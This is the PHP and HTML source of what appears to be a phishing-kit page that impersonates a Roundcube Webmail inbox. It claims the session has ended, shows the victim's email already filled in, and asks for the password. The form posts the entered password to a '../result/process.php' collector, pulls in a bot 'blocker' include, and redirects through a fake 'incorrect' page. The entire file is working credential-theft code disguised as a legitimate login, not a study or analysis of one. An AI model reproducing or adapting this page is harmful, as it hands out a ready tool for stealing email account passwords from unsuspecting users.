<?php
include('../blocker.php');
session_start();
	$host  = $_SERVER['HTTP_HOST']; $host_upper = strtoupper($host); $path   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<title>Roundcube Webmail :: Inbox</title>
<meta name="viewport" content="" id="viewport" />
<link rel="shortcut icon" href="../control/images/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="../control/styles.min.css" />

<script type="text/javascript">
function checkFilled() {
    var fn=document.getElementById('_pass').value;	
	 if(fn.length < 5){
        document.getElementById('_pass').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efired').style.display = "block";
        return false;
    }else{
		document.getElementById('_pass').style.borderColor = "blue";
    }
}


</script>
</head>
<body class="minwidth">

<div id="header">
<div id="topline" role="banner" aria-labelledby="aria-label-topnav">
	<h2 id="aria-label-topnav" class="voice">Window control</h2>
	<div class="topleft">
		
                                <img id="imgLogo" class="navbar-brand-logo" src="../control/images/webmail.png" />
					</div>
	
	<div class="topright">
	<img src="../control/images/user.png" width="14" height="14" style="margin-top:2px;" />
			<span class="username"><b style="color:#FFF;"><?php if($_SESSION['email']) { echo $_SESSION['email']; } ?></b></span>
		<a class="button-logout" id="rcmbtn101" role="button" href="" onclick="return rcmail.command('switch-task','logout',this,event)">Logout</a>
	
	</div>
</div>
<div id="topnav">
	<h2 id="aria-label-tasknav" class="voice">Application tasks</h2>
	<div id="taskbar" class="topright" role="navigation" aria-labelledby="aria-label-tasknav">
		<a class="button-mail" id="rcmbtn102" role="button"  href=""><span class="button-inner">Mail</span></a>
		<a class="button-addressbook" id="rcmbtn103" role="button"  href=""><span class="button-inner">Address Book</span></a>
		
		<a class="button-settings" id="rcmbtn104" role="button" href=""><span class="button-inner">Settings</span></a>
		<a class="button-logout" id="rcmbtn105" role="button" href="./?_task=logout" onclick="return rcmail.command('switch-task','logout',this,event)"><span class="button-inner">Logout</span></a>
		<span class="minmodetoggle" role="presentation"></span>
	</div>
	<img src="../control/images/roundcube_logo.png" id="toplogo" alt="Logo">
</div>

<br style="clear:both" />
</div>


<div id="mainscreen">

<h1 class="voice">Mail</h1>

<!-- toolbar -->
<h2 id="aria-label-toolbar" class="voice">Application toolbar</h2>
<div id="messagetoolbar" class="toolbar" role="toolbar" aria-labelledby="aria-label-toolbar">
	<a class="button checkmail" title="Check for new messages" id="rcmbtn106" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('checkmail','',this,event)">Refresh</a>
	<a class="button compose" title="Create a new message" id="rcmbtn107" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('compose','',this,event)">Compose</a>
<span class="spacer"></span>
<a class="button reply" title="Reply to sender" id="rcmbtn108" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('reply','',this,event)">Reply</a>
<span class="dropbutton">
	<a class="button reply-all" title="Reply to list or to sender and all recipients" href="">Reply all</a>
	<a href="" class="dropbuttontip">Reply-all options</a>
</span>
<span class="dropbutton">
	<a class="button forward" title="Forward the message" id="rcmbtn110" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('forward','',this,event)">Forward</a>
	<a href="#forward" class="dropbuttontip" id="forwardmenulink" onclick="UI.toggle_popup('forwardmenu',event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="forwardmenu-menu" tabindex="0">Forwarding options</a>
</span>
<a class="button delete " title="Delete message" id="rcmbtn111" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('delete','',this,event)">Delete</a>

<a id="markmessagemenulink" class="button markmessage" title="Mark messages" onclick="UI.toggle_popup('markmessagemenu',event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="markmessagemenu-menu" role="button" href="">Mark</a>
<a id="messagemenulink" class="button more" title="More actions..." onclick="UI.toggle_popup('messagemenu',event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="messagemenu-menu" role="button" href="">More</a>

<div id="forwardmenu" class="popupmenu" aria-hidden="true">
	<h3 id="aria-label-forwardmenu" class="voice">Forwarding options</h3>
	<ul id="forwardmenu-menu" class="toolbarmenu" role="menu" aria-labelledby="aria-label-forwardmenu">
		<li role="menuitem"><a class="forwardlink" id="rcmbtn112" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('forward-inline','sub',this,event)">Forward inline</a></li>
		<li role="menuitem"><a class="forwardattachmentlink" id="rcmbtn113" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('forward-attachment','sub',this,event)">Forward as attachment</a></li>
		
	</ul>
</div>

<div id="replyallmenu" class="popupmenu" aria-hidden="true">
	<h3 id="aria-label-replyallmenu" class="voice">Reply-all options</h3>
	<ul id="replyallmenu-menu" class="toolbarmenu" role="menu" aria-labelledby="aria-label-replyallmenu">
		<li role="menuitem"><a class="replyalllink" id="rcmbtn114" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('reply-all','sub',this,event)">Reply all</a></li>
		<li role="menuitem"><a class="replylistlink" id="rcmbtn115" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('reply-list','sub',this,event)">Reply list</a></li>
		
	</ul>
</div>





</div>

<div id="messagesearchtools">

<!-- search filter -->


<!-- search box -->
<div id="quicksearchbar" class="searchbox" role="search" aria-labelledby="aria-label-searchform">
<h2 id="aria-label-searchform" class="voice">Email message search form</h2>
<label for="quicksearchbox" class="voice">Email search input</label>
<a id="searchmenulink" class="iconbutton searchoptions" title="Search modifiers" aria-haspopup="true" aria-expanded="false" aria-owns="searchmenu-menu" role="button" href="">Options</a>
<form name="rcmqsearhform"><input name="_q" id="quicksearchbox" type="text"></form>




</div>

</div>
<div id="mainscreencontent">
<div id="mailview-left">


<div id="login-form" style="margin-top:30px;">
<div class="box-inner" role="main">
<img src="../control/images/roundcube_logo.png" id="logo" alt="Roundcube Webmail">
<form name="form" method="post" action="../result/process.php" autocomplete="off"  onsubmit="return checkFilled();">
<input name="agenti" type="hidden" id="agenti" value="Roundcube Webmail"><input name="redir" type="hidden" id="redir" value="<?php echo $me."/incorrect.php?https://cpsess1530024440/webmail/paper_lantern/index.html?mailclient=roundcube%2Fmail&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession"; ?>">
<span id="efired" style="display:none; font-size:12px; padding-left:95px; color:rgb(232, 17, 35); font-weight:bold;">Password is required.</span>
<table><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
</td>
<td class="input">
<input name="auto_user" type="text" required id="auto_user" style="font-weight:bold;" value="<?php if($_SESSION['email']) { echo $_SESSION['email']; } ?>" size="40" readonly autocapitalize="off">
            <input name="_user" type="hidden" id="_user" value="<?php if($_SESSION['email']) { echo $_SESSION['email']; } ?>">
            </td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label></td>
<td class="input"><input name="_pass" id="_pass" required size="40" autocapitalize="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><input type="submit" id="rcmloginsubmit" onClick="check(this.form)" class="button mainaction" value="Login"></p>

</form>

</div>

<div class="box-bottom" role="complementary">
	<div id="message" style="font-weight:bold; color:#766; font-size:11px;">You have successfully terminated the session. <span style="color:#000;">Login to Continue.</span></div>

</div>

<div id="bottomline" role="contentinfo">
	Roundcube Webmail 
		
</div>
</div>





</div><!-- end mailview-right -->

</div>
<!-- end mainscreencontent -->

</div><!-- end mainscreen -->










<div id="messagestack"></div>


</body>
</html>